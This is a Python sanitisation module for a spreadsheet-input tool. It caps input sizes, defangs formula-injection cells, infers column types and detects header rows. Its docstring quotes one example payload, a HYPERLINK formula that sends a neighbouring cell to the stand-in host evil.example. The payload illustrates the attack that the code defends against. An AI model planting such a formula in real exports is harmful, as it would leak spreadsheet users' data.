"""
sanitize.py — cell-level cleaning and the limits every input route obeys.

Shared by the paste route and the upload route, deliberately: a threat that is
neutralised for one input must not be live for the other. This is the single
place that decides what a "safe cell" is.

The threat that actually matters here is CSV / formula injection (sometimes
called DDE injection): a cell whose text begins with = + - or @ is interpreted
as a formula by Excel and Sheets when the data is later exported and opened.
A cell like

    =HYPERLINK("http://evil.example/?x="&A1,"click")

exfiltrates a neighbouring cell if a user opens an export of our data. We never
execute it — Python treats it as a string — but anything we echo back could end
up pasted into a spreadsheet, so it is defanged at the boundary.
"""

from __future__ import annotations

import re
import unicodedata

from .models import SafetyReport

# ---- hard limits -----------------------------------------------------------
# The user is asked for all columns and a few rows, so these are generous
# relative to the intended use and small enough to stop denial-of-service.
MAX_CHARS = 20_000
MAX_COLS = 50
MAX_CELL_LEN = 500

# The product rule: only a handful of sample rows are needed to infer column
# roles and types. More rows add nothing and are truncated with a notice.
MAX_DATA_ROWS = 4

_INJECTION_PREFIXES = ("=", "+", "-", "@")

# Tab, newline and carriage return are structure, not control noise.
_CONTROL_CHARS = {chr(c) for c in range(32)} - {"\t", "\n", "\r"}


def clean_cell(value: str, report: SafetyReport, row: int, col: int) -> str:
    """Normalise one cell and defang it if it looks like a formula."""
    value = unicodedata.normalize("NFC", str(value))
    value = "".join(ch for ch in value if ch not in _CONTROL_CHARS)
    value = value.strip()

    if len(value) > MAX_CELL_LEN:
        value = value[:MAX_CELL_LEN]
        report.warnings.append(f"R{row}C{col}: cell truncated to {MAX_CELL_LEN} characters")

    if value[:1] in _INJECTION_PREFIXES:
        preview = value[:24] + ("…" if len(value) > 24 else "")
        report.injection_cells.append(f"R{row}C{col}: {preview}")
        # A leading apostrophe forces literal text in both Excel and Sheets.
        value = "'" + value

    return value


# ---- type inference --------------------------------------------------------

_NUMBER_RE = re.compile(r"-?\d{1,3}(?:[ .,]\d{3})*(?:[.,]\d+)?|-?\d+(?:[.,]\d+)?")
_DATE_RE = re.compile(r"\d{1,4}[-/.]\d{1,2}[-/.]\d{1,4}")
_BOOL_VALUES = {"true", "false", "yes", "no", "da", "nu", "adevarat", "fals"}


_CURRENCY_PREFIX = re.compile("^[\u20ac$\u00a3]\\s*")
_CURRENCY_SUFFIX = re.compile(r"\s*(lei|ron|eur|usd|mdl)$", re.IGNORECASE)
_ANY_SPACE = re.compile("[\\s\u00a0\u202f]+")


def _is_number(value: str) -> bool:
    """True for things a user would call a number, currency markers included.

    Spaces of every kind are stripped first: spreadsheets export U+00A0 and
    U+202F as thousands separators in several locales, and a value that looks
    numeric to a person must not be classed as text because of an invisible
    character.
    """
    candidate = _ANY_SPACE.sub("", value)
    candidate = _CURRENCY_PREFIX.sub("", candidate)
    candidate = _CURRENCY_SUFFIX.sub("", candidate)
    return bool(candidate) and bool(_NUMBER_RE.fullmatch(candidate))


def infer_type(values: list[str]) -> str:
    """Infer a column's type from its sample values.

    Returns number | date | bool | text | empty. Deliberately strict: one
    non-numeric value makes a column text, because a column that is "mostly"
    numeric is usually a text column with a stray total row, and treating it as
    numeric produces silently wrong formulas.
    """
    present = [v for v in values if v != ""]
    if not present:
        return "empty"
    if all(_is_number(v) for v in present):
        return "number"
    if all(_DATE_RE.fullmatch(v) for v in present):
        return "date"
    if all(v.lower() in _BOOL_VALUES for v in present):
        return "bool"
    return "text"


def looks_like_header(first_row: list[str], rest: list[list[str]]) -> bool:
    """Guess whether the first row is a header.

    Primary signal: headers are non-numeric while the data below contains
    numbers. That signal is absent in an all-text table, which is common — so
    there is a second test for the shape of a header row: every cell filled,
    none numeric, and no duplicates. Real headers look like that; a row of data
    usually repeats a value or leaves a cell empty somewhere.

    Defaulting to True when nothing is decisive is the safer error. Treating a
    header as data adds one junk row to a sample; treating data as a header
    loses a row and mislabels every column.
    """
    if not first_row:
        return False

    def numeric_fraction(row: list[str]) -> float:
        numeric = sum(1 for cell in row if _is_number(cell.strip()))
        return numeric / max(len(row), 1)

    head = numeric_fraction(first_row)
    if head >= 0.3:
        return False          # numbers in the first row: it is data
    if not rest:
        return True

    body = sum(numeric_fraction(r) for r in rest) / len(rest)
    if body > head:
        return True           # text on top, numbers below: a header

    cells = [c.strip() for c in first_row]
    return all(cells) and len(set(cells)) == len(cells)
